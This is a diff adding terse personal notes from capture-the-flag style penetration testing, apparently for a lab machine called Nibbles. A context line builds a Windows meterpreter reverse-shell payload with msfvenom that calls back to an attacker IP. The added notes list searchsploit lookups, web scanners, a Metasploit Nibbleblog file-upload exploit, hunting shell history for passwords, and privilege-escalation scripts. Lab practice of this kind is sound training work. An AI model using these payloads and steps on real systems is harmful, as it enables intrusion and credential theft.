@@ -394,3 +394,31 @@ type "2 for the price of 1.txt"
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.29 LPORT=5555 -f exe > sh.exe
 
 exploit(multi/handler)
+-----------------------------------------------------
+
+NIBBLES
+enter 80 and use 22
+
+Ubuntu server
+
+searchsploit apache 2.4
+searchsploit nibble
+
+.rb = metasploit
+exploit /loca/ = be on the machine
+nikto
+dirbuster
+enumeration wepalyzer
+comments in source code -> searchsploit nibble
+sometimes SQL Injection -> shell
+
+msf> exploit/multi/http/nibbleblog_file_upload
+uname -a
+info
+sudo -l
+history -> passwd entered
+
+LinEnum.sh
+linuxprivchecher.sh
+
+
